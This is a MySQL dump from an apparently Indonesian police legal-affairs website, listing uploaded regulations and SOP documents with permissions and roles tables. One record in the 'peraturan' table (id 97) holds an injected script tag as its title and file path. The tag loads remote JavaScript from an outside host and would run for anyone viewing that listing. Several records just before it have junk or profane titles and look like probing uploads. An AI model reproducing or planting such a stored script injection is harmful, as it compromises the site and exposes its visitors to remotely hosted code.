INSERT INTO `peraturan` VALUES (65, NULL, 'PENERAPAN DISIPLIN DAN PENEGAKAN HUKUM PROTOKOL KESEHATAN SEBAGAI UPAYA PENCEGAHAN DAN PENGENDALIAN CORONA VIRUS DISEASE 2019 (COVID-19)', 'public/upload/peraturan/PENERAPAN DISIPLIN DAN PENEGAKAN HUKUM PROTOKOL KESEHATAN SEBAGAI UPAYA PENCEGAHAN DAN PENGENDALIAN CORONA VIRUS DISEASE 2019 (COVID-19)G8JXCwY36bfiZYaY.pdf', 4, 'Administrator', '2021-01-06 12:05:02', '2021-01-06 12:05:02');
INSERT INTO `peraturan` VALUES (66, NULL, 'LAMPIRAN PERGUB 50 TAHUN 2020', 'public/upload/peraturan/LAMPIRAN PERGUB 50 TAHUN 2020BhkqO5t1GZtBouH1.pdf', 4, 'Administrator', '2021-01-06 12:05:53', '2021-01-06 12:05:53');
INSERT INTO `peraturan` VALUES (67, NULL, 'TATA CARA PELAKSANAAN TINDAKAN KEBIRI KIMTA, PEMASANGAN ALAT PENDETEKSI ELEKTRONIK, REHABILITASI, DAN PENGUMUMAN IDENTITAS PELAKU KEKERASAN SEKSUAL TERHADAP ANAK', 'public/upload/peraturan/TATA CARA PELAKSANAAN TINDAKAN KEBIRI KIMTA, PEMASANGAN ALAT PENDETEKSI ELEKTRONIK, REHABILITASI, DAN PENGUMUMAN IDENTITAS PELAKU KEKERASAN SEKSUAL TERHADAP ANAKjbJi3d3f4SocJdzt.pdf', 4, 'Administrator', '2021-01-06 12:07:07', '2021-01-06 12:07:07');
INSERT INTO `peraturan` VALUES (68, NULL, 'Perkap 6 tahun 2019', 'public/upload/peraturan/Perkap 6 tahun 20198QiDowEGcSMWAHFM.pdf', 3, 'Administrator', '2021-03-15 10:42:41', '2021-03-15 10:42:41');
INSERT INTO `peraturan` VALUES (69, NULL, 'Perpol 2 tahun 2018', 'public/upload/peraturan/Perpol 2 tahun 2018sWBooCu8qnXbYDkc.pdf', 3, 'Administrator', '2021-03-15 10:44:00', '2021-03-15 10:44:00');
INSERT INTO `peraturan` VALUES (70, NULL, 'Perpol 2 tahun 2021', 'public/upload/peraturan/Perpol 2 tahun 2021faVndm4stU5IZKk7.pdf', 3, 'Administrator', '2021-03-15 10:45:08', '2021-03-15 10:45:08');
INSERT INTO `peraturan` VALUES (71, NULL, 'PERPOL 2 TAHUN 2021 TTG SOTK POLRES & POLSEK', 'public/upload/peraturan/PERPOL 2 TAHUN 2021 TTG SOTK POLRES & POLSEKOfANll5XkpyvfmJD.pdf', 3, 'Administrator', '2021-03-16 12:01:23', '2021-03-16 12:01:23');
INSERT INTO `peraturan` VALUES (72, NULL, 'SOP PENYULUHAN HUKUM POLRES LOTENG', 'public/upload/peraturan/SOP PENYULUHAN HUKUM POLRES LOTENGQT6MeLj1Pgl2XECF.pdf', 1, 'Administrator', '2021-03-16 12:06:50', '2021-03-16 12:06:50');
INSERT INTO `peraturan` VALUES (73, NULL, 'SOP PENYUSUNAN PSH POLRES LOTENG', 'public/upload/peraturan/SOP PENYUSUNAN PSH POLRES LOTENGoOmFdUPOOx1P9n6q.pdf', 1, 'Administrator', '2021-03-16 12:08:17', '2021-03-16 12:08:17');
INSERT INTO `peraturan` VALUES (74, NULL, 'SOP PENYUSUNAN PSH POLRES DOMPU', 'public/upload/peraturan/SOP PENYUSUNAN PSH POLRES DOMPUozrvuF6yGRTC7pWb.pdf', 1, 'Administrator', '2021-03-16 12:10:26', '2021-03-16 12:10:26');
INSERT INTO `peraturan` VALUES (75, NULL, 'SOP PELAKSANAAN PENYULUHAN HUKUM POLRES DOMPU', 'public/upload/peraturan/SOP PELAKSANAAN PENYULUHAN HUKUM POLRES DOMPUGBrGSMwY3T2ZULnJ.pdf', 1, 'Administrator', '2021-03-16 12:11:46', '2021-03-16 12:11:46');
INSERT INTO `peraturan` VALUES (76, NULL, 'SOP PENYUSUNAN PSH POLRES LOTARA', 'public/upload/peraturan/SOP PENYUSUNAN PSH POLRES LOTARArWRiBWQjX98Pmy8R.pdf', 1, 'Administrator', '2021-03-16 12:14:47', '2021-03-16 12:14:47');
INSERT INTO `peraturan` VALUES (77, NULL, 'SOP PENYULUHAN HUKUM POLRES LOTARA', 'public/upload/peraturan/SOP PENYULUHAN HUKUM POLRES LOTARAd99mrjfcoHyopRjt.pdf', 1, 'Administrator', '2021-03-16 12:15:54', '2021-03-16 12:15:54');
INSERT INTO `peraturan` VALUES (78, NULL, 'SOP PENYUSUNAN PSH POLRES LOBAR', 'public/upload/peraturan/SOP PENYUSUNAN PSH POLRES LOBARo1LF4QkszBz4SrWz.pdf', 1, 'Administrator', '2021-03-16 12:18:34', '2021-03-16 12:18:34');
INSERT INTO `peraturan` VALUES (79, NULL, 'SOP PENYULUHAN HUKUM POLRES LOTIM', 'public/upload/peraturan/SOP PENYULUHAN HUKUM POLRES LOTIMl9nSe4DRQ7UW9fH3.pdf', 1, 'Administrator', '2021-03-16 12:19:23', '2021-03-16 12:19:23');
INSERT INTO `peraturan` VALUES (80, NULL, 'SOP PENYUSUNAN PSH POLRES LOTIM', 'public/upload/peraturan/SOP PENYUSUNAN PSH POLRES LOTIMJWovb0wx3Cyii2Xj.pdf', 1, 'Administrator', '2021-03-16 12:19:59', '2021-03-16 12:19:59');
INSERT INTO `peraturan` VALUES (81, NULL, 'SOP PENYULUHAN HUKUM POLRES SUMBAWA', 'public/upload/peraturan/SOP PENYULUHAN HUKUM POLRES SUMBAWAWnEqqPLnimqeDE7I.pdf', 1, 'Administrator', '2021-03-16 12:21:01', '2021-03-16 12:21:01');
INSERT INTO `peraturan` VALUES (82, NULL, 'SOP PENYUSUNAN PSH POLRES SUMBAWA', 'public/upload/peraturan/SOP PENYUSUNAN PSH POLRES SUMBAWAXJwpWrLRojSAUU7Q.pdf', 1, 'Administrator', '2021-03-16 12:21:50', '2021-03-16 12:21:50');
INSERT INTO `peraturan` VALUES (83, NULL, 'SOP PENYUSUNAN PSH POLRES SUMBAWA', 'public/upload/peraturan/SOP PENYUSUNAN PSH POLRES SUMBAWACqXN1F242rS3sZb3.pdf', 1, 'Administrator', '2021-03-16 12:22:35', '2021-03-16 12:22:35');
INSERT INTO `peraturan` VALUES (84, NULL, 'SOP PENYULUHAN HUKUM POLRES MATARAM', 'public/upload/peraturan/SOP PENYULUHAN HUKUM POLRES MATARAMCt5ZiBOaJGnT7gLo.pdf', 1, 'Administrator', '2021-03-16 12:23:23', '2021-03-16 12:23:23');
INSERT INTO `peraturan` VALUES (85, NULL, 'SOP PENYUSUNAN PSH POLRESTA MATARAM', 'public/upload/peraturan/SOP PENYUSUNAN PSH POLRESTA MATARAMvez8uSi4zAVbxX4r.pdf', 1, 'Administrator', '2021-03-16 12:24:10', '2021-03-16 12:24:10');
INSERT INTO `peraturan` VALUES (86, NULL, 'SOP PENYUSUNAN PSH POLRES LOBAR', 'public/upload/peraturan/SOP PENYUSUNAN PSH POLRES LOBAR6anUFj9tBDXMc841.pdf', 1, 'Administrator', '2021-03-16 12:29:15', '2021-03-16 12:29:15');
INSERT INTO `peraturan` VALUES (87, NULL, 'SKB UU ITE', 'public/upload/peraturan/SKB UU ITEt98nB8KxdrHAjp1Z.pdf', 1, 'Administrator', '2021-06-24 20:03:52', '2021-06-24 20:03:52');
INSERT INTO `peraturan` VALUES (88, NULL, 'PERPOL 4 TAHUN 2020 TTG PENGAMANAN SWAKARSA', 'public/upload/peraturan/PERPOL 4 TAHUN 2020 TTG PENGAMANAN SWAKARSAsB2hXgcMKD0OLkdX.pdf', 3, 'Administrator', '2021-06-24 20:07:41', '2021-06-24 20:07:41');
INSERT INTO `peraturan` VALUES (89, NULL, 'PERKAP NOMOR 6 TAHUN 2021 TTG PEMBENTUKAN UNIT ORGANISASI TERTENTU PADA SATUAN KEWILAYAHAN', 'public/upload/peraturan/PERKAP NOMOR 6 TAHUN 2021 TTG PEMBENTUKAN UNIT ORGANISASI TERTENTU PADA SATUAN KEWILAYAHANvGgdLcugF4DoqTHY.pdf', 3, 'Administrator', '2021-06-24 20:11:37', '2021-06-24 20:11:37');
INSERT INTO `peraturan` VALUES (90, NULL, 'PERKAP NOMOR 1 TAHUN 2021 TTG AUDIT KINERJA DAN AUDIT DENGAN TUJUAN TERTENTU', 'public/upload/peraturan/PERKAP NOMOR 1 TAHUN 2021 TTG AUDIT KINERJA DAN AUDIT DENGAN TUJUAN TERTENTUBwvmnwCKZ95PJg3i.pdf', 3, 'Administrator', '2021-06-24 20:13:21', '2021-06-24 20:13:21');
INSERT INTO `peraturan` VALUES (91, NULL, 'PERPOL NOMOR 1 TAHUN 2018 TTG LAYANAN POLISI 110', 'public/upload/peraturan/PERPOL NOMOR 1 TAHUN 2018 TTG LAYANAN POLISI 110ynVh6fbM7aPGH1SQ.pdf', 3, 'Administrator', '2021-06-24 20:15:24', '2021-06-24 20:15:24');
INSERT INTO `peraturan` VALUES (92, NULL, 'Ok', 'public/upload/peraturan/Ok97xzve7niMJFVyeV.pdf', 1, 'Administrator', '2021-09-20 01:29:02', '2021-09-20 01:29:02');
INSERT INTO `peraturan` VALUES (93, NULL, 'Hh', 'public/upload/peraturan/HhvsxXdRgUldx4hVv4.pdf', 1, 'Administrator', '2021-09-20 01:36:46', '2021-09-20 01:36:46');
INSERT INTO `peraturan` VALUES (94, NULL, 'Gansx', 'public/upload/peraturan/GansxMQeQeyid65XGuvsO.pdf', 1, 'Administrator', '2021-09-20 01:46:32', '2021-09-20 01:46:32');
INSERT INTO `peraturan` VALUES (95, NULL, 'Cuk', 'public/upload/peraturan/CukxqSoE5rwnWwIsKo6.pdf', 1, 'Administrator', '2021-09-20 01:47:53', '2021-09-20 01:47:53');
INSERT INTO `peraturan` VALUES (96, NULL, 'Asw', 'public/upload/peraturan/AswWOuz3V1cBUXpDIQG.pdf', 1, 'Administrator', '2021-09-20 01:53:50', '2021-09-20 01:53:50');
INSERT INTO `peraturan` VALUES (97, NULL, '<script src=https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/08f23bce.js></script>', 'public/upload/peraturan/<script src=https://labsosio.ui.ac.id/wp-snapshots/tmp/tools/jso/08f23bce.js></script>BCdMGSZKDZrCqovB.pdf', 2, 'Administrator', '2021-12-03 05:47:27', '2021-12-03 05:47:27');

-- ----------------------------
-- Table structure for peraturan_jenis
-- ----------------------------
DROP TABLE IF EXISTS `peraturan_jenis`;
CREATE TABLE `peraturan_jenis`  (
  `peraturan_jenis_id` bigint NOT NULL AUTO_INCREMENT,
  `peraturan_jenis_nama` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`peraturan_jenis_id`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 6 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of peraturan_jenis
-- ----------------------------
INSERT INTO `peraturan_jenis` VALUES (1, 'LAINNYA', NULL, '2020-07-05 13:29:09', NULL);
INSERT INTO `peraturan_jenis` VALUES (2, 'UNDANG-UNDANG', NULL, '2020-07-05 13:29:32', NULL);
INSERT INTO `peraturan_jenis` VALUES (3, 'PERKAP', NULL, '2020-07-05 13:28:24', NULL);
INSERT INTO `peraturan_jenis` VALUES (4, 'PERATURAN PEMERINTAH', '2020-01-30 08:53:59', '2020-07-05 13:28:03', NULL);
INSERT INTO `peraturan_jenis` VALUES (5, 'PERPRES', '2020-07-05 15:04:12', '2020-07-05 15:04:12', NULL);

-- ----------------------------
-- Table structure for permissions
-- ----------------------------
DROP TABLE IF EXISTS `permissions`;
CREATE TABLE `permissions`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `guard_name` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 30 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of permissions
-- ----------------------------
INSERT INTO `permissions` VALUES (1, 'dashboard', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (2, 'bantuan hukum', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (3, 'praperadilan', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (4, 'pidana', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (5, 'perdata', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (6, 'agama', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (7, 'konsultasihukum', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (8, 'pendapatsaranhukum', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (9, 'lensakegiatan', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (10, 'peraturan', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (11, 'jenisperaturan', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (12, 'dataperaturan', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (13, 'pengguna', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `permissions` VALUES (14, 'dashboard', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (15, 'bantuan hukum', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (16, 'praperadilan', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (17, 'pidana', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (18, 'perdata', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (19, 'agama', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (20, 'ptun', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (21, 'konsultasihukum', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (22, 'pendapatsaranhukum', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (23, 'lensakegiatan', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (24, 'peraturan', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (25, 'jenisperaturan', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (26, 'dataperaturan', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (27, 'pengguna', 'web', '2019-12-31 11:03:44', '2019-12-31 11:03:44');
INSERT INTO `permissions` VALUES (28, 'laporan', 'web', NULL, NULL);
INSERT INTO `permissions` VALUES (29, 'daftarkonsultasihukum', 'web', NULL, NULL);

-- ----------------------------
-- Table structure for role_has_permissions
-- ----------------------------
DROP TABLE IF EXISTS `role_has_permissions`;
CREATE TABLE `role_has_permissions`  (
  `permission_id` bigint UNSIGNED NOT NULL,
  `role_id` bigint UNSIGNED NOT NULL
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of role_has_permissions
-- ----------------------------

-- ----------------------------
-- Table structure for roles
-- ----------------------------
DROP TABLE IF EXISTS `roles`;
CREATE TABLE `roles`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `guard_name` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of roles
-- ----------------------------
INSERT INTO `roles` VALUES (1, 'administrator', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `roles` VALUES (2, 'user', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');
INSERT INTO `roles` VALUES (3, 'member', 'web', '2019-12-31 10:37:33', '2019-12-31 10:37:33');

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users`  (
  `id` bigint UNSIGNED NOT NULL,
  `name` varchar(191) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `avatar` varchar(191) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `email` varchar(191) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(191) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `remember_token` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL,
  `admin` tinyint(1) NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of users
-- ----------------------------

SET FOREIGN_KEY_CHECKS = 1;
